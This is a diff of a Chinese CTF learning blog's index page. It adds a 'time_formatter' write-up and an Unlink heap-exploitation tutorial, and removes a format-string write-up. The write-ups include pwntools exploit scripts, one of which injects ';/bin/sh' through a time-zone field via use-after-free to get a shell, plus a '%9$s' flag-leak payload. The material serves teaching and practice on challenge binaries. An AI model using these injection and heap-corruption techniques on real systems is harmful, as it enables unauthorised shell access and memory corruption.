@@ -78,6 +78,108 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-攻防世界堆溢出UAF-time-formatter" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/" class="article-date">
+  <time class="dt-published" datetime="2021-06-12T23:34:03.000Z" itemprop="datePublished">2021-06-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/">攻防世界堆溢出UAF_time_formatter</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>在linux shell中，假如有如下语句，这就是shell注入方面<br>echo “;ls;cat 1.txt;/bin/sh;”<br>则 ls 、cat 1.txt 、/bin/sh 这三个命令就会一次执行，这也是本题突破的关键</p>
+<h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><p>C语言或C++申请内存后，用free 或 delete 释放堆后，指针的值还在，如果不手动设置为<br>NULL，就可以被我们利用。</p>
+<p>堆内存的分配有规律，看如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">char</span> *c = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,(<span class="keyword">long</span>)c);</span><br><span class="line">		<span class="built_in">free</span>(c);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,(<span class="keyword">long</span>)c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们在Ubuntu上用gcc编译后运行此代码，输出的地址全部一样，这说明，当前一个堆释放<br>后，新创建的堆的地址就是前一个堆的地址。</p>
+<p>那么，我们来看题<br>①选项5退出时，释放了内存，但是并没有将指针设置为NULL，因此指针仍指向原来的那个地址<br><img src="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/1.png" alt="1.png"><br>②选项4，有system，这里判断ptr是否为空，于是我们在退出时，选择不退出，这样我们释放了<br>第一个堆，然后我们在选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，然后我们在<br>选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，也就是Ptr的内容，最后再选择<br>4，执行getshell。这就是UAF（use after free）漏洞，通过UAF漏洞使得set_time_zone分配<br>得到的是set_format释放掉的内存。<br><img src="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/2.png" alt="2.png"><br>这样，格式化字符串后的command就是<br>/bin/date -d @ “;/bin/sh”</p>
+<p>于是我们的脚本就这样写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwnh9&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">57042</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Are you sure you want to exit (y/N)?&#x27;</span>,<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Time zone:&#x27;</span>,<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/" data-id="ckpvd5y1f0000f8u6dmj11jr5" data-title="攻防世界堆溢出UAF_time_formatter" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Unlink" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/11/Unlink/" class="article-date">
+  <time class="dt-published" datetime="2021-06-11T16:17:03.000Z" itemprop="datePublished">2021-06-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/11/Unlink/">Unlink</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>我们在利用unlink所造成的漏洞是，其实就是对chunk进行内存布局，然后借助unlink操作<br>来达成修改指针的效果。</p>
+<p>我们先来简单回顾一下unlink的目的与过程，其目的是把一个双向链表中的空闲块拿出来<br>（例如free时和目前物理相邻的free chunk进行合并）。其基本的过程如下：<br><img src="/2021/06/11/Unlink/1.png" alt="1.png"><br>下面我们首先介绍一下unlink最初没有防护时的利用方法，然后介绍目前利用Unlink的方式。</p>
+<h3 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h3><p>最初unlink实现的时候，其实是没有对chunk的size检查和双向链表检查的，即没有如下检查<br>代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>
+<p>这里我们以32位为例，假设堆内存最初的布局是下面的样子<br><img src="/2021/06/11/Unlink/2.png" alt="2.png"><br>现在有物理空间连续的两个chunk（Q,Nextchunk），其中Q处于使用状态、Nextchunk<br>处于释放状态。那么如果我们通过某种方式（比如溢出）将Nextchunk的fd和bk指针修改为<br>指定的值。则当我们free(Q)时<br>①glibc判断这个块是small chunk<br>②判断向前合并，发现前一个chunk处于使用状态，不需要向前合并<br>③判断向后合并，发现后一个chunk处于空闲状态，需要合并<br>④继而对Nextchunk采取unlink操作<br>那么unlink具体执行的效果是什么样子呢？<br>①FD=P-&gt;fd = target addr -12<br>②BK=P-&gt;bk = expect value<br>③FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value<br>④BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12<br>看起来我们似乎可以通过unlink直接实现任意地址读写目的，但是我们还是需要确保expect<br>value+8的地址具有可写权限。</p>
+<p>比如说我们将target addr 设置成某个got表项，那么当程序调用对应的Libc函数时，就会直接<br>执行我们设置的值（expect value）处的代码。需要注意的是，expect value+8处的值被破坏<br>了，需要想办法绕过。</p>
+<h3 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h3><p>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们对比一下<br>fd和bk的检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>
+<p>此时<br>①FD-&gt;bk = target addr - 12 + 12=target_addr<br>②BK-&gt;fd = expect value + 8<br>那么我们上面所利用的修改GOT表项的方法就可能不可用了。但是我们可以通过伪造的方式<br>绕过这个机制。<br>首先我们通过覆盖，将nextchunk的FD指针指向了fakeFD，将nextchunk的BX指针指向了<br>fakeBK。那么为了通过验证，我们需要<br>①fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P<br>②fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P<br>当满足上述两个式子时，可以进入unlink环节，进行如下操作：<br>①fakeFD -&gt; bk = fakeBK &lt;=&gt; <em>(fakeFD + 12) = fakeBK<br>②fakeBK -&gt; fd = fakeFD &lt;=&gt; <em>(fakeBK + 8) = fakeFD<br>如果让fakeFD+12和fakeBK+8指向同一个指向P的指针，那么：<br>①</em>P = P - 8<br>②</em>P = P - 12<br>即通过此方式，P的指针指向了比自己低12的地址处。此方法虽然不可以实现任意地址写，<br>但是可以修改指向chunk的指针，这样的修改是可以达到一定的效果的。</p>
+<p>如果我们想要使得两者都指向P，只需要按照如下方式修改即可<br><img src="/2021/06/11/Unlink/3.png" alt="3.png"><br>需要注意的是，这里我们并没有违背下面的约束，因为P在unlink前是指向正确的chunk的<br>指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">     malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure>
+<p><strong>此外，其实如果我们设置next chunk的fd和bk均为nextchunk的地址也是可以绕过上面的<br>检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><p>1、UAF，可修改free状态下smallbin或是unsorted bin 的fd和Bk指针<br>2、一直位置存在一个指针指向可进行UAF的chunk</p>
+<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>使得已指向UAF chunk的指针ptr变为ptr-0x18</p>
+<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>设指向可UAF chunk的指针的地址为ptr<br>①修改fd为 ptr-0x18<br>②修改bk为ptr-0x10<br>③触发unlink<br>ptr处的指针会变为Ptr-0x18</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/06/11/Unlink/" data-id="ckptiht2m00002cu61v1t7jhd" data-title="Unlink" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-off-by-one" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/06/11/off-by-one/" class="article-date">
@@ -485,86 +587,6 @@
 
 
   
-    <article id="post-格式化字符串之CTFwiki-goodluck" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/" class="article-date">
-  <time class="dt-published" datetime="2021-04-24T06:58:00.000Z" itemprop="datePublished">2021-04-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/">格式化字符串之CTFwiki-Goodluck</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="献上goodluck的伪代码"><a href="#献上goodluck的伪代码" class="headerlink" title="献上goodluck的伪代码"></a>献上goodluck的伪代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+3h] [rbp-3Dh]</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  signed int j; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  char *format; // [rsp+8h] [rbp-38h]</span><br><span class="line">  _IO_FILE *fp; // [rsp+10h] [rbp-30h]</span><br><span class="line">  char *v9; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char v10[24]; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  fp = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 21; ++i )</span><br><span class="line">    v10[i] = _IO_getc(fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  v9 = v10;</span><br><span class="line">  puts(<span class="string">&quot;what&#x27;s the flag&quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  format = 0LL;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ms&quot;</span>, &amp;format);</span><br><span class="line">  <span class="keyword">for</span> ( j = 0; j &lt;= 21; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v10[j] != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      puts(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="漏洞点printf-format"><a href="#漏洞点printf-format" class="headerlink" title="漏洞点printf(format);"></a>漏洞点printf(format);</h4><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>我们先在本地创建一个flag.txt文件，以保证程序正常运行<br><img src="/2021/04/24/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/1.png" alt="1.png"><br>结合伪代码和 ./goodluck 我们发现：<br>程序用 IO_getc 把 flag.txt 读入栈中，然后让我们输入字符串，最后输出字符串。</p>
-<h2 id="献上脚本"><a href="#献上脚本" class="headerlink" title="献上脚本"></a>献上脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9<span class="variable">$s</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将断点断在printf(fmtstr)上，先后输入<br> r 和 step。发现printf栈帧周围存在已经入栈的flag.txt的内容。<br>发现偏移为4。<br>但是此程序为64位，加上6个寄存器，偏移为10<br>但是%9$s是不包括fmtstr本身的偏移，所以最终偏移为9<br>最后写出脚本，泄露flag.txt.</p>
-<h4 id="有关flag-txt入栈的细节可以自行研究"><a href="#有关flag-txt入栈的细节可以自行研究" class="headerlink" title="有关flag.txt入栈的细节可以自行研究"></a>有关flag.txt入栈的细节可以自行研究</h4>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/" data-id="cknvemjlo0000kcu6b6voccln" data-title="格式化字符串之CTFwiki-Goodluck" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-pwn学习谷歌关键词" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/" class="article-date">
-  <time class="dt-published" datetime="2021-04-19T13:44:22.574Z" itemprop="datePublished">2021-04-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/">Pwn学习谷歌关键词</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="XCTF攻防世界"><a href="#XCTF攻防世界" class="headerlink" title="XCTF攻防世界"></a>XCTF攻防世界</h3><h3 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h3><h3 id="BMZCTF"><a href="#BMZCTF" class="headerlink" title="BMZCTF"></a>BMZCTF</h3><h3 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h3><h3 id="CTFwiki"><a href="#CTFwiki" class="headerlink" title="CTFwiki"></a>CTFwiki</h3><h3 id="pwntools官方文档"><a href="#pwntools官方文档" class="headerlink" title="pwntools官方文档"></a>pwntools官方文档</h3>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/" data-id="cknq0526u00000wu69vo5fri6" data-title="Pwn学习谷歌关键词" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -615,6 +637,14 @@
       <ul>
         
           <li>
+            <a href="/2021/06/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/">二进制软件逆向分析基础</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">分箱式内存管理</a>
+          </li>
+        
+          <li>
             <a href="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/">PWN-Shellcode编写</a>
           </li>
         
@@ -624,14 +654,6 @@
         
           <li>
             <a href="/2021/06/19/pwn%E5%AD%A6%E4%B9%A0%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%8F%82%E8%80%83/">Pwn学习思维导图参考</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/19/fastbin-attack/">Fastbin Attack</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/">Linux动态内存管理机制</a>
           </li>
         
       </ul>
